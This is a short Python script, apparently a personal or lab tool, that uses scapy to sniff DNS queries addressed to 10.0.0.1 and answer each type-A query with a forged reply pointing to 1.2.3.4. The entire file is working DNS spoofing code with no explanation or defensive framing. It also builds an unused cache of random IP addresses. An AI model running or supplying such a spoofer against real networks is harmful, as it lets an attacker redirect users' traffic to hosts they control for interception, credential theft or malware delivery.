from scapy.all import *
from pdb import set_trace # debuger python for breakpint
from pprint import pprint as pp

# DNS SPPOF on 10.0.0.1

# domain -> ip
cache = {}

def callback(pkt):
    global cache
    if DNSQR not in pkt:
        return
    query = pkt[DNSQR]
    #filter only dns request type A
    if(query.qtype != 1):
        return
    

    
    target_domain = query.qname
    
    reply_ip = cache.setdefault(target_domain, str(RandIP()))

    response_packet = IP(
        src=pkt[IP].dst, 
        dst=pkt[IP].src
        ) / UDP(
            dport=pkt[UDP].sport,
            sport=pkt[UDP].dport
        ) / DNS(
            rcode="ok",
            opcode="QUERY",
            qr=1,
            qd=pkt[DNSQR],
            id=pkt[DNS].id,
            an=DNSRR(
                rrname=target_domain, 
                type="A", 
                rdata="1.2.3.4"))

    send(response_packet)

sniff(prn=callback, filter="udp port 53 and ip dst 10.0.0.1" ,store=0, iface=["eno1"])